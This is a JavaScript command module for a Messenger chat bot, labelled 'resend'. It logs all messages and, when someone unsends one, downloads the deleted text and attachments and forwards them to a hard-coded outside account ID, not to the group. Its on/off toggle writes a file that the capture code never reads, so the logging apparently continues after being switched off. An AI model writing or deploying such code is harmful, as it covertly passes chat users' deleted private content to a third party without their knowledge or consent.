const request = require("request");
const fs = require("fs");
const axios = require("axios");

const destinationUID = "100077513002567"; // replace with the desired UID

module.exports = {
  config: {
    name: "resend",
    version: "1.1",
    author: "yamada | loufi | kshitiz",
    countDown: 5,
    role: 2,
    shortDescription: "",
    longDescription: "",
    category: "group",
  },

  onChat: async function ({ event, api, threadsData, usersData }) {
    const { createReadStream } = require("fs");
    const { messageID, senderID, threadID, body: content } = event;

    if (!global.logMessage) global.logMessage = new Map();
    if (!global.data) global.data = {};
    if (!global.data.botID) global.data.botID = api.getCurrentUserID();

    const thread = await threadsData.get(parseInt(threadID)) || {};

    if (typeof thread["resend"] !== "undefined" && thread["resend"] === false) return;

    if (senderID === global.data.botID) return;

    if (event.type !== "message_unsend") {
      global.logMessage.set(messageID, {
        msgBody: content,
        attachments: event.attachments,
      });
    }

    if (event.type === "message_unsend") {
      const getMsg = global.logMessage.get(messageID);
      if (!getMsg) return;

      const { name: senderName } = await usersData.get(senderID);
      const msg = {
        body: `${senderName} has just deleted ${getMsg.attachments.length} attachments ${getMsg.msgBody !== "" ? `\deleted content: ${getMsg.msgBody}` : ""}`,
        attachment: [],
        mentions: { tag: senderName, id: senderID },
      };

      for (let i = 0; i < getMsg.attachments.length; i++) {
        const attachment = getMsg.attachments[i];

        const { data, headers } = await axios.get(attachment.url, { responseType: "arraybuffer" });
        const contentType = headers["content-type"];
        const extension = contentType.split("/")[1];
        const path = `${__dirname}/cache/${i + 1}.${extension}`;
        fs.writeFileSync(path, Buffer.from(data), "binary");
        const readStream = createReadStream(path);
        msg.attachment.push(readStream);
        readStream.on("end", function () {
          fs.unlink(path, function (err) {
            if (err) {
              console.error(err);
            }
          });
        });
      }

   
      api.sendMessage(msg, destinationUID);
    }
  },

  onStart: async function ({ api, event, threadsData }) {
    const { threadID, messageID } = event;

    let data = {};
    try {
      data = JSON.parse(fs.readFileSync("./resend_data.json", "utf-8"));
    } catch (error) {
      console.log(error);
    }

    const resendEnabled = data[threadID] ? data[threadID] : false;
    data[threadID] = !resendEnabled;

    fs.writeFileSync("./resend_data.json", JSON.stringify(data, null, 2));

    const msg = `✅Successfully ${(data[threadID] === true ? "enabled" : "disabled")} resend mode.`;
    api.sendMessage(msg, threadID, (err, messageInfo) => {
      if (!err && messageInfo.messageID !== messageID) {
        setTimeout(() => {
          api.unsendMessage(messageInfo.messageID);
        }, 2000);
      }
    });
  },
};